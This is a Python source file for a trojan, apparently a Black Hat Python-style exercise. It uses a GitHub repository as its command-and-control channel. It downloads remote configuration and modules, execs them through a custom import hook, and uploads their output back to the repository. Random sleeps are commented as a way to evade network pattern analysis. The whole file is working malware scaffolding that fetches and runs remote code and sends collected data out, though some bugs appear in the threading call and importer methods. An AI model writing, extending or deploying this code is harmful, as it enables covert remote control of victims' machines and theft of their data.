import time
import sys
import base64
import json
import queue
import threading
import random
import types

from github3 import login

trojanId = "uniqueId"

trojanConfig = "%s.json" % trojanId
dataPath = "data/%s/" % trojanId
trojanModules = []
configured = False
taskQueue = queue.SimpleQueue()

password = "Whatever my github password is"


# authenticates the user and gets repo and branch objects
def connectToGithub():
    github = login(username="AlexanderStocks", password=password)
    repo = github.repository("AlexanderStocks", "Networking-RemoteTrojanControl")
    currentBranch = repo.branch("master")

    return github, repo, currentBranch


# grabs files then read contents locally
def getFileContents(filepath):
    github, repo, currentBranch = connectToGithub()
    tree = currentBranch.commit.commit.tree.recurse()

    for filename in tree.tree:

        if filepath in filename.path:
            print("[*] Found file %s" % filepath)
            blob = repo.blob(filename._json_data['sha'])
            return blob.content
    return None


# retrieves remote config document from repo
def getTrojanConfig():
    global configured
    configJson = getFileContents(trojanConfig)
    config = json.loads(base64.b64decode(configJson))
    configured = True

    for task in config:
        if task["module"] not in sys.modules:
            exec("import %s" % task["module"])
    return config


# push collected data
def storeModuleResult(data):
    github, repo, currentBranch = connectToGithub()
    remotePath = "data/%s/%d.data" % (trojanId, random.randint(1000, 100000))
    repo.create_file(remotePath, "Storing module result", base64.b64encode(data))

    return


class GitImporter(object):
    def __init__(self):
        self.currentModuleCode = ""

    def findModule(self, fullname, path=None):
        if configured:
            print("[*] Attempting to retrieve %s" % fullname)
            newLibrary = getFileContents("modules/%s" % fullname)

            if newLibrary is not None:
                # tells interpreter the module has been found and it can then load it
                self.currentModuleCode = base64.b64decode(newLibrary)
                
                return self

        return None

    def loadModule(self, name):
        # create a blank module
        module = types.ModuleType(name)
        # put code from module we found into our new blank module
        exec(self.currentModuleCode, module.__dict__)
        # insert new module into sys.modules so picked up by future import calls
        sys.modules[name] = module

        return module


def moduleRunner(module):
    taskQueue.put(1)
    result = sys.modules[module].run()
    taskQueue.get()

    # store result in repo
    storeModuleResult(result)

    return

# add custom module importer to sys.meta_path
sys.meta_path = [GitImporter()]

while True:

    if taskQueue.empty():

        config = getTrojanConfig()

        for task in config:
            t = threading.Thread(target=moduleRunner(), args=(task['module'],))
            t.start()
            # sleep to hide from network pattern analysis tools
            time.sleep(random.randint(1, 10))

    time.sleep(random.randint(1000, 10000))
